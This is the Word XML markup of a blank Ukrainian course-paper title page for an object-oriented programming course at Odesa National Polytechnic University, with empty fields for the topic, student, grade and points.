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939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:left="10" w:right="80" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Одеський</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національний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>політехнічний</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університет</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:left="10" w:right="85" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Інститут</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комп'ютерних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="10" w:right="86" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Кафедра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>інформаційних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="130"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">КУРСОВА РОБОТА </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="00CE73AC" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="10" w:right="80" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>дисципліни</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Об’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>єктно-орієнтоване</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програмування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="2391" w:right="1070" w:hanging="653"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Тема </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>«»</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:r>
        <w:t xml:space="preserve">                                                                                 Студента (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) курсу </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>групи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                                                                                              </w:t>
      </w:r>
      <w:r w:rsidR="007D0939">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve">) </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                                                        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>Керівник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D0939">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t>Рудніченко</w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="007D0939">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t>М.Д</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">(посада, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>вчене</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>звання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>науковий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ступінь</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Національна</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> шкала </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                         </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="007D0939" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:t xml:space="preserve">                                                             </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Кількість</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>балів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">             __</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>Оцінка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:t>: ECTS ____</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve">_ </w:t>
      </w:r>
    </w:p>
